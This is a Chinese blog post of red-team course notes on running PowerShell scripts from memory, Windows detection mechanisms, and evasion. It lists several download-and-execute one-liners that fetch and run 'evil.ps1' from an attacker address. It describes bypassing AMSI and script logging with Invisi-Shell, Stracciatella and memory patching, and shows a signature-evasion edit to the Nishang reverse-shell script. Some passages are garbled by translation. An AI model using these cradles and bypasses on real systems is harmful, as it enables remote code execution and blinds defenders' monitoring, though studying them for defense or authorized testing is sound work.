---
title: 免杀分析 | PowerShell命令执行、检测与绕过
url: https://mp.weixin.qq.com/s/7Tto5H7OxmpTQGkyyVfOuQ
source: Doonsec's feed
date: 2026-05-15
fetch_date: 2026-05-16T05:12:28.400928
---

# 免杀分析 | PowerShell命令执行、检测与绕过

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/xs5iaj3AmKI2m3qvQM4qy2rPJzOmtulBLOGRDwBQ2rfibcdwmcYyON86Ks6ER1ll6hyaGbYN49DkJIHibicSVLlGBYVicmzpVbZNiaZLuFrSITg9M/0?wx_fmt=jpeg)

# 免杀分析 | PowerShell命令执行、检测与绕过

liang
liang

LTAC

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 课程引用： 本文内容源于对 Altersec (Pentester Academy) 提供的 CRTP (Certified Red Team Professional) 认证课程的学习总结与实战笔记。 文中涉及的实验环境、部分脚本逻辑及核心原理（如 PowerUp 偏移量分析、AMSI 绕过思路等）版权归原课程作者及相关开源项目（如 PowerSploit, Invoke-Obfuscation）所有。

# PowerShell特性

* 内存执行
* 调用 .NET
* 系统权限高
* 无需落地文件

# 参考命令

从远程服务器获取脚本内容并在当前计算机的内存中直接运行，而将脚本文件保存到本地硬盘。

## 1.Net.WebClient方式

```
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

## 2. IE COM对象方式（绕过检测）

通过调用 Internet Explorer 的 COM 接口进行下载，其行为更加接近正常的网页访问，用于尝试规避 EDR 的特定检测规则

```
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

## 3. PSv3及以上版本(iwr)方式

使用 PowerShell 3.0 引入的（别名）命令``` Invoke-WebRequest``iwr ```

```
iex (iwr 'http://192.168.230.1/evil.ps1')
```

## 4. XMLHTTP COM对象方式

通过调用旧版本的 MSXML2.XMLHTTP COM 对象来完成下载任务

```
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```

## 5.System.NET.WebRequest方式

利用底层.NET类手动创建Web请求并读取流数据。这种方式通常比直接使用更能逃避一些针对高层cmdlet的监控`iex (iwr ...)`

```
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1"); $r = $wr.GetResponse(); IEX([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

以下是根据来源资料为您列举的几种PowerShell下载执行（Download Execute Cradles)的实现方式名称：

1. Net.WebClient方式：最经典且常用的基础下载执行方式。
2. IE COM对象方式：通过调用Internet Explorer应用程序组件来伪装流量，用于规避检测。
3. PSv3 (iwr) 方式：利用PowerShell 3.0及以上版本输入的命令`Invoke-WebRequest`。
4. XMLHTTP COM对象方式：使用旧版组件进行下载`Msxml2.XMLHTTP`。
5. System.NET.WebRequest 方式：利用更简单的.NET类库手动创建请求，通常比高级命令更底层。

Invoke-CradleCrafter ，这是一个专门用于中断和生成此类下载命令执行的工具https://github.com/danielbohannon/Invoke-CradleCrafter

# 检测技术

在现代 Active Directory 环境中，PowerShell 是攻击者最常使用的工具之一，因此微软引入了相应的安全检测机制来增加攻击入口。以下是根据提供的有关这些检测技术的数据的详细阅读：

主要有以下技术

* 全系统转录
* 脚本块日志记录
* 反恶意软件扫描接口 (AMSI)
* 受限语言模式 (CLM) - 与 Applocker 和 WDAC（设备卫士）集成

## 全系统转录（System-wide Transcription）

核心功能：该功能会记录PowerShell会话中的所有输入和输出内容，并将其保存到指定的文本文件中。这不仅记录了执行的命令，还记录了命令返回的结果（例如枚举出的用户列表或报错信息）。

适用范围：它不仅针对，还涵盖了 PowerShell ISE 以及任何使用 PowerShell 引擎（）的自定义主机（如利用、或运行的环境）``` powershell.exe``System.Management.Automation.dll``.NET DLL``msbuild``installutil ```。

防御价值：为安全审计提供了完整的会话记录。虽然攻击者可以通过隐藏干扰手段命令，但调整功能会记录下命令执行后的明文结果

## 脚本块日志记录（Script Block Logging）

核心功能：记录PowerShell引擎处理的所有脚本块内容。

技术特性：由于脚本在执行前必须在内存中被“还原”为原始代码，脚本块日志能够在冲突代码解密后将捕获其

事件标识：记录在Windows事件日志的路径下，事件ID为4104`Microsoft-Windows-PowerShell/Operational`。

组成部分：大部分的脚本会被分割为多个具有相同的脚本块 ID 4104事件。

## 反恶意软件扫描接口（AMSI）

核心功能：AMSI 是一个接口，允许应用程序（如 PowerShell）与安装的安全产品（如 Windows Defender）集成

运行机制：当脚本准备在内存中执行时（无论是从磁盘加载、加密后的命令还是直接在内存中生成），PowerShell引擎会先将代码发送给AMSI进行扫描

检测重点：它主要针对无文件攻击（Fileless Attacks）。即使攻击者不将脚本保存到磁盘上，AMSI 也能在代码执行的那一刻识别出已知的恶意特征

日志记录：被AMSI拦截的行为通常记录在日志中，事件ID为1116和1117`Windows Defender/Operational`

## 建立语言模式 (CLM) 与 Applocker / WDAC 集成

* CLM（约束语言模式）

这是一种高度的PowerShell环境，旨在减少攻击面。在CLM模式下，许多危险的功能被禁用，例如：禁止直接调用Win32 API、禁止使用编译代码、以及限制对.NET类的访问`Add-Type`。

* 与 Applocker 的集成： 当 Applocker 配置为“强制执行（Enforcement）”模式且应用了脚本规则时，普通启动用户的 PowerShell 会话会自动降级为 CLM。 防御漏洞：资料中已提到，Applocker 的规则有时十分丰富。例如，默认规则可能允许任何人运行或目录下的脚本，攻击者如果能在这些目录下写入文件，就可以绕过 CLM 的部分限制执行默认功能的脚本``` C:\Program Files``C:\Windows ```。
* 与WDAC (设备卫士) 的集成： WDAC（Windows Defender Application Control）提供比Applocker更底层的故障策略。 它包含UMCI（用户模式代码缺陷），这会干扰大多数横向移动攻击。 其核心逻辑是：使用脚本/二进制文件是已知的、经过签名的“好代码”，否则一律禁止运行。

# 绕过 PowerShell 安全机制

## 1.Invisi-Shell：

通过挂钩（Hooking）程序集，在启动时直接取消AMSI、脚本块日志和监听功能`.NET``System.Management.Automation.dll`。本质上就是PowerShell启动时，先偷偷加载一个DLL，然后Hook System.Management.Automation.dll（PowerShell 引擎核心 DLL）

```
PowerShell
   ↓
调用 AMSI
   ↓
Defender 扫描
```

Hook 后：

```
PowerShell
   ↓
Hook函数
   ↓
直接返回“安全”
```

在对 PowerShell 的 `System.Management.Automation.dll` 进行运行时 Hook 时，常见的目标主要集中在安全检测与审计链路上

例如 AMSI 与脚本日志机制。AMSI 原本会通过 `AmsiScanBuffer()` 对每段脚本内容进行扫描并返回检测结果，但在被 Hook 或修改后，这一调用可能被强制改写为始终返回“无威胁（CLEAN）”，从而使脚本内容不再触发安全引擎检测。

同时，Script Block Logging 负责记录 PowerShell 执行的脚本内容，但在相关日志函数被拦截或绕过后，这些执行记录不会写入事件日志，从而在系统审计层面隐身。这类操作本质上是对 PowerShell 运行时安全链路检测加记录的双重干预，使执行行为在功能上仍正常运行，但在安全监控与日志层面被削弱或抑制。

```
https://github.com/OmerYa/Invisi-Shell
```

先根据当前权限选择对应的启动脚本，如果拥有管理员权限就运行 `RunWithPathAsAdmin.bat`，通过系统级环境变量方式启动一个被改造过的 PowerShell 会话；如果没有管理员权限，则使用 `RunWithRegistryNonAdmin.bat`，通过当前用户注册表环境进行注入，从而在不提权的情况下实现相同的运行时修改效果。启动完成后会打开一个新的 PowerShell 会话，在该会话中执行命令时，其行为会受到运行时修改的影响，例如日志记录或检测机制被改变。

使用结束后，只需要在该 PowerShell 窗口中输入 `exit` 退出会话，即可结束该临时环境并恢复系统正常的 PowerShell 行为状态。

## 2.Stracciatella：

一个C#加载器，可以启动一个取消了AMSI、CLM和脚本块日志的PowerShell运行空间。

Stracciatella 本质上是一个基于 C# 的 PowerShell 执行环境构建方式，它不依赖外部启动 `powershell.exe` 进程，而是在程序内部直接通过 `RunspaceFactory.CreateRunspace()` 创建一个 PowerShell 运行空间（Runspace），并在该运行空间中加载并执行脚本逻辑。这样做的特点是整个 PowerShell 执行链路被嵌入到应用程序内部，而不是作为独立进程存在，因此执行过程更隐蔽、可控性更强。

同时，这类实现通常会对运行时环境做一些定制化处理，例如调整执行策略、加载自定义会话配置等，从而实现类似“嵌入式 PowerShell 执行引擎”的效果，用于在应用内部完成脚本驱动的自动化或管理任务。

## 3.内存补丁：

使用特定的PowerShell代码片段在内存中修改等标志位来取消AMSI`amsiInitFailed`。

所谓 Memory Patching（内存补丁），指的是程序在运行过程中直接对进程内存中的代码或数据进行修改，而不是去改动磁盘上的原始文件。它的核心特点是“只影响运行时状态”。

在 Windows 环境中，这类技术通常表现为对已加载模块中的函数逻辑进行动态调整，例如修改函数返回值、改变条件跳转逻辑、或者直接修改关键的状态标志位。以安全机制相关组件为例，当某些函数被加载到内存后，其执行路径可能会被运行时覆盖或重写，从而改变原本的行为表现。

这类操作一般统称为 运行时内存修改（Memory Patching)，其本质不是持久化更改系统组件，而是对当前进程执行流程进行即时干预与重构。

## 4.使用替代方案：

例如使用进攻性 .NET(C#) 开发的工具，因为 .NET 环境目前可能缺少 PowerShell 引擎中实现的某些深度安全功能`SafetyKatz`、`Rubeus`

```
PowerShell 防护很多
    ↓
红队想办法绕过
    ↓
1. Hook PowerShell（Invisi-Shell）
2. 自建Runspace（Stracciatella）
3. Patch AMSI内存
4. 干脆不用PowerShell
    ↓
改用纯.NET工具
    ↓
Rubeus / SafetyKatz
```

# 自我检测

通过 AMSITrigger 和 DefenderCheck 分析脚本中会被 Windows Defender 标记的部分，再使用 Invoke-Obfuscation 对脚本进行混淆，从而降低被静态签名和运行时检测识别的概率。

避免基于特征码的检测的步骤非常简单：

1. 使用 AMSITrigger 进行扫描
2. 修改检测到的代码片段
3. 使用 AMSITrigger 重新扫描
4. 重复步骤 2 和 3，直到结果为“AMSI\_RESULT\_NOT\_DETECTED”或“空白”。

# 绕过案例-Invoke-PowerShellTcp

这是一个由Nishang框架提供的PowerShell脚本，用于在目标机器上建立TCP反弹Shell（Reverse Shell）

```
https://github.com/RythmStick/AMSITrigger

https://github.com/t3hbb/DefenderCheck
```

使用https://github.com/RythmStick/AMSITrigger ) 或 DefenderCheck ( https://github.com/t3hbb/DefenderCheck ) 来识别 Windows Defender 可能标记的二进制文件或脚本中的代码和字符串。

```
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1

DefenderCheck.exe PowerUp.ps1
```

要对 PowerShell 脚本进行完整混淆，请参阅 Invoke-Obfuscation（https://github.com/danielbohannon/Invoke-Obfuscation）。本课程中就使用了它来混淆 AMSI 绕过代码！

![image](https://mmbiz.qpic.cn/sz_mmbiz_png/xs5iaj3AmKI14gLaedH1sZsuSW7lAYImRlPric7vVKWknaCER8VcWicS7pvfqJArP12DnPe0329icnpckicZWY4KMMwD9TYRD5gZoA0mz5KsOwOE/640?wx_fmt=png&from=appmsg)

image

* 将第 32 行的“Net.Sockets”字符串反转 $String = "stekcoS.teN"

```
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join''
```

如果 ($反转)

```
{

$client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)

}
```

```
Bypassing AV Signatures for PowerShell - Invoke-PowerShellTcp

- Reverse the "Net.Sockets" string on line number 32

```powershell
$String = "stekcos.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
    $client = New-Object System.$class.TCPClient($IPAddress,$Port)
}
```

# 绕过案例-Invoke-PowerUp

PowerSploit/Privesc/PowerUp.ps1 at master · PowerShellMafia/PowerSploit使用 DefenderCheck 扫描脚本，然后使用 C:\AD\Tools 文件夹中的 ByteToLineNumber.ps1 脚本。 检测部分位于偏移量 0x1DCD2 处

![](https://mmbiz.qpic.cn/mmbiz_png/xs5iaj3AmKI24b8ibgiccg5sngYib1sxicAaDISn5ibQkaCNKJ2Ae8EEfsJ6rgzJSRu3NCiaSmjAn6T4N5mqXCvibPdFvOUGQb4a23Wf4LSIZowWeoA/640?wx_fmt=png&from=appmsg)

使用 ByteToLineNumber.ps1 脚本找到检测到的部分的行号

![](https://mmbiz.qpic.cn/mmbiz_png/xs5iaj3AmKI0ibeFOu8LrE9HnemQBGZPG6HxcEOOhtMdjb4pvuJVqicRaUriaT2Lm5jYEsL7oRTGTcGHc9lfbWUU4PF2sQloO4ZpdI3eZ0rHS0s/640?wx_fmt=png&from=appmsg)

发现检测到的偏移量对应的行号为 1984

![](https...